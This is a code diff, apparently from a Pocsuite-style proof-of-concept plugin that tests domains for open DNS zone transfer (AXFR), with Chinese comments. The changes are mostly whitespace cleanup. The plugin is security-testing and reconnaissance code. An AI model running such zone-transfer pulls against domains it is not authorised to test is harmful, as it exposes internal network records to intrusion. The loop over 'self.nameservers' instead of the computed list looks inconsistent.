@@ -29,30 +29,30 @@ class DNS_transforPoc(POCBase):
        一个重要的手段是使用Private DNS。如果内部DNS泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。
     '''  # 漏洞简要描述
     samples = []  # 测试样列,就是用 PoC 测试成功的网站
-    install_requires = [ 'socket', 'dnspython']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    install_requires = ['socket', 'dnspython']
 
     def _attack(self):
         vul_url = self.url
         result = {}
         nss = resolver.query(vul_url, 'NS')
-        nameservers = [ str(ns) for ns in nss ]
+        nameservers = [str(ns) for ns in nss]
         for ns in self.nameservers:
             z = self.query(ns)
-            if z!=None:
-                result['domain'] =  vul_url
+            if z != None:
+                result['domain'] = vul_url
                 result['ns'] = ns
         return self.parse_attack(result)
-
 
     def _verify(self, verify=True):
         vul_url = self.url
         result = {}
         nss = resolver.query(vul_url, 'NS')
-        nameservers = [ str(ns) for ns in nss ]
+        nameservers = [str(ns) for ns in nss]
         for ns in self.nameservers:
             z = self.query(ns)
-            if z!=None:
-                result['domain'] =  vul_url
+            if z != None:
+                result['domain'] = vul_url
                 result['ns'] = ns
         return self.parse_attack(result)
 
@@ -74,12 +74,10 @@ class DNS_transforPoc(POCBase):
         else:
             return z
 
-
     def resolve_a(self, name):
         """Pulls down an A record for a name"""
         nsres = resolver.query(name, 'A')
         return str(nsres[0])
-
 
     def pull_zone(self, nameserver):
         """Sends the domain transfer request"""
@@ -90,5 +88,6 @@ class DNS_transforPoc(POCBase):
         if not zone:
             raise EOFError
         return zone
+
 
 register(DNS_transforPoc)
